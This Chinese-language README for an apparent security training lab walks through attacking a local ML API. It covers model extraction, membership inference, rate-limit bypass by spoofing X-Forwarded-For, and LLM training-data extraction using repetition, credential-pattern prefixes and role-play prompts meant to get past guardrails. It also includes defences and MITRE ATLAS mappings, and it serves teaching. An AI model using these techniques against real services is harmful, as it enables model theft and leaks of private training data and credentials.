# Lab 06：模型抽取与推理攻击

## 概述

攻击一个已部署的ML模型API，窃取其功能并推断关于其训练数据的隐私信息。本实验涵盖针对机器学习模型的三类攻击：

1. **模型抽取（模型窃取）** -- 系统地查询目标API，构建一个本地克隆，无需访问原始权重或训练数据即可复制其预测。
2. **成员推断** -- 通过分析置信度分数分布，确定特定数据点是否被用于训练目标模型。
3. **训练数据提取** -- 尝试利用已知的提示模式从LLM中恢复记忆化的内容。

这些攻击证明了为什么ML即服务API需要的不仅仅是网络安全层面的保护——预测输出本身就是一个泄露通道。

## 学习目标

- 探测ML API以收集关于底层模型的情报
- 通过头部欺骗（X-Forwarded-For）绕过速率限制
- 执行模型抽取攻击并衡量抽取保真度
- 使用置信度分数分析执行成员推断攻击
- 尝试通过提示工程从LLM中提取训练数据
- 评估当前防御措施的有效性并提出改进建议

## 架构图

```
                      ┌──────────────────────────────────┐
                      │         攻击者机器                 │
                      │                                   │
                      │  model_extraction.py              │
                      │  membership_inference.py          │
                      │  llm_extraction.py                │
                      └────────────┬──────────────────────┘
                                   │
                          HTTP (端口 5000)
                                   │
                      ┌────────────▼──────────────────────┐
                      │       target-api (Flask)           │
                      │       lab06-target-api             │
                      │                                    │
                      │  POST /predict    ← 情感API       │
                      │  POST /chat       ← LLM端点       │
                      │  GET  /model-info ← 元数据泄露    │
                      │  GET  /rate-limit-status ← 信息   │
                      │  GET  /health                     │
                      │                                    │
                      │  ┌─────────────────────────┐       │
                      │  │ TF-IDF + LogisticRegr.  │       │
                      │  │ （情感分类器）           │       │
                      │  └─────────────────────────┘       │
                      └────────────┬───────────────────────┘
                                   │
                          HTTP (端口 11434)
                                   │
                      ┌────────────▼───────────────────────┐
                      │         ollama                      │
                      │         lab06-ollama                │
                      │                                     │
                      │   mistral:7b-instruct-q4_0          │
                      │   （用于 /chat 端点的LLM）          │
                      │                                     │
                      │   卷：ollama_data                   │
                      └─────────────────────────────────────┘
```

## 服务

| 服务 | 容器 | 端口 | 描述 |
|---------|-----------|------|-------------|
| ollama | lab06-ollama | 11434 | Ollama LLM运行时（Mistral 7B） |
| ollama-setup | lab06-ollama-setup | -- | 首次启动时拉取Mistral模型 |
| target-api | lab06-target-api | 5000 | 提供情感分类器 + LLM聊天的Flask API |

## 快速开始

```bash
# 启动所有服务
docker-compose up -d

# 等待模型下载完成（可能需要几分钟）
docker-compose logs -f ollama-setup

# 验证API健康状态
curl http://localhost:5000/health

# 检查情感分类器
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "This product is amazing!"}'

# 检查LLM聊天端点
curl -X POST http://localhost:5000/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello, how are you?"}'
```

## 练习

### 练习1：侦察——探测目标API

探索API泄露了哪些关于其内部结构的信息。

```bash
# 健康检查——确认API正在运行
curl http://localhost:5000/health | python3 -m json.tool

# 模型信息——泄露架构、类别名称、词汇量大小
# 漏洞：这告诉攻击者应该构建什么样的替代模型
curl http://localhost:5000/model-info | python3 -m json.tool

# 速率限制状态——披露了限制机制
# 漏洞：暴露出X-Forwarded-For被信任用于IP识别
curl http://localhost:5000/rate-limit-status | python3 -m json.tool

# 测试预测——注意响应中的完整概率分布
# 漏洞：置信度分数使得模型抽取更加高效
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "I love this product"}' | python3 -m json.tool

# 测试不同的情感
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "This is terrible"}' | python3 -m json.tool

curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "It is an average product"}' | python3 -m json.tool
```

**注意观察：**
- /model-info 端点暴露了确切的流水线（TF-IDF + LogisticRegression）
- 类别名称、词汇量大小和ngram范围均被披露
- 置信度分数以完整精度（6位小数）返回
- 速率限制状态揭示了IP识别机制

### 练习2：速率限制绕过——X-Forwarded-For欺骗

API使用基于IP的速率限制，但信任X-Forwarded-For头。

```bash
# 发送请求直到触发速率限制（每分钟60次请求）
for i in $(seq 1 65); do
  curl -s -o /dev/null -w "请求 $i: %{http_code}\n" \
    -X POST http://localhost:5000/predict \
    -H "Content-Type: application/json" \
    -d '{"text": "test"}';
done

# 观察：第61次及之后的请求返回HTTP 429（请求过多）

# 检查我们的速率限制状态
curl http://localhost:5000/rate-limit-status | python3 -m json.tool

# 现在通过欺骗X-Forwarded-For来绕过限制
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.0.0.99" \
  -d '{"text": "test bypassing rate limit"}' | python3 -m json.tool

# 验证：服务器将我们视为不同的IP
curl -H "X-Forwarded-For: 10.0.0.99" \
  http://localhost:5000/rate-limit-status | python3 -m json.tool

# 每个唯一的伪造IP都拥有自己独立的速率限制配额
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:5000/predict \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.$i.1" \
    -d "{\"text\": \"伪造的请求 $i\"}" | python3 -m json.tool;
done
```

### 练习3：模型抽取——构建替代模型

运行自动化的模型抽取脚本。

```bash
# 从脚本目录运行或将其挂载到容器中
cd scripts/
pip install requests numpy scikit-learn
python3 model_extraction.py
```

**脚本功能说明：**
1. 从 /model-info 收集模型元数据
2. 向 /predict 发送80多个不同的查询，收集标签和置信度分数
3. 演示速率限制被触发，然后绕过它
4. 在被窃取的数据上训练本地替代模型（TF-IDF + LogisticRegression）
5. 在20个保留文本上测试两个模型，计算抽取保真度

**注意观察：**
- 替代模型达到高保真度（与目标模型的一致性）
- /model-info 端点告诉攻击者应该使用什么架构
- 速率限制通过IP欺骗被轻易绕过
- 攻击者现在拥有一个免费的、本地的"专有"模型副本

### 练习4：成员推断——分析置信度分布

运行成员推断攻击以确定特定样本是否在训练数据中。

```bash
python3 membership_inference.py
```

**脚本功能说明：**
1. 用24个已知在训练数据中的样本查询目标
2. 用24个肯定不在训练数据中的新样本查询
3. 比较置信度分数分布（均值、中位数、标准差等）
4. 遍历阈值以构建最优攻击分类器
5. 报告准确率、精确率、召回率和混淆矩阵

**注意观察：**
- 训练样本倾向于获得更高的置信度分数
- 一个简单的阈值分类器就可以区分成员和非成员
- 这是一种隐私攻击：它揭示了关于训练数据集的信息
- 完整的概率分布使攻击更加容易

### 练习5：LLM数据提取——恢复记忆化内容

尝试从Mistral LLM中提取训练数据。

```bash
python3 llm_extraction.py
```

**脚本功能说明：**
1. **重复攻击** -- 发送高度重复的提示，迫使模型进入不寻常的生成状态
2. **补全攻击** -- 提供知名文本的开头（许可证、代码头）以测试逐字记忆化
3. **前缀探测** -- 使用敏感模式（API密钥、密码、SSH密钥）作为提示
4. **基于角色的攻击** -- 社会工程提示，要求模型"回忆"训练数据

**注意观察：**
- 模型可能会逐字补全知名文本（MIT许可证、RFC 2119关键词）
- 重复攻击可能会产生令人惊讶或不寻常的输出
- 敏感模式探测测试模型是否生成类似凭据的数据
- 现代模型有防护措施，但某些提示可能会部分绕过它们
- 结果记录到 /tmp/llm_extraction_log.json 以供分析

### 练习6：防御分析

评估现有的防御措施并考虑改进方案。

```bash
# 1. 测试如果只返回标签（没有置信度分数）会发生什么
# 目前API返回完整的概率——如果不返回呢？
curl -X POST http://localhost:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"text": "I love this"}' | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('带概率：', d)
print('不带（仅标签）：', {'prediction': d['prediction']})
print()
print('问题：仅用标签进行抽取会难多少？')
print('答案：难得多——攻击者需要约10倍的查询次数')
print('        且无法基于软标签/置信度分数进行训练。')
"

# 2. 模拟输出扰动（向置信度添加噪声）
python3 -c "
import numpy as np
confidence = 0.923456
print(f'原始置信度：{confidence}')
for noise_level in [0.01, 0.05, 0.10]:
    noisy = confidence + np.random.normal(0, noise_level)
    noisy = max(0, min(1, noisy))
    print(f'添加噪声（std={noise_level}）：{noisy:.6f}')
print()
print('输出扰动通过向分数添加校准噪声，使抽取和成员')
print('推断攻击都更加困难。')
"

# 3. 思考以下问题：
# - 要抽取这种规模的模型需要多少次查询？
# - 如果模型有1000个类别而不是3个会怎样？
# - API密钥 + 每账户限制会如何改变攻击方式？
# - 什么样的监控可以检测到系统性的抽取尝试？
```

## 漏洞总结

| # | 漏洞 | 端点 | 影响 | MITRE ATLAS |
|---|--------------|----------|--------|-------------|
| 1 | 模型元数据泄露 | GET /model-info | 暴露架构、类别、词汇量大小——实现定向抽取 | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 2 | 返回完整置信度分数 | POST /predict | 实现高效的模型抽取和成员推断 | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 3 | X-Forwarded-For被信任用于速率限制 | POST /predict, /chat | 攻击者可伪造IP以绕过基于IP的速率限制 | [AML.T0040](https://atlas.mitre.org/techniques/AML.T0040) |
| 4 | 速率限制状态信息泄露 | GET /rate-limit-status | 暴露速率限制机制和IP识别方法 | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) |
| 5 | 无查询模式检测 | POST /predict | 系统性的抽取查询不被检测 | [AML.T0042](https://atlas.mitre.org/techniques/AML.T0042) |
| 6 | LLM训练数据记忆化 | POST /chat | 提示可以引出记忆化的训练内容 | [AML.T0024](https://atlas.mitre.org/techniques/AML.T0024) |

## 清理

```bash
docker-compose down -v
```

## 下一实验

前往 [Lab 07：AI红队自动化](../lab07-automation/) 构建自动化攻击流水线。
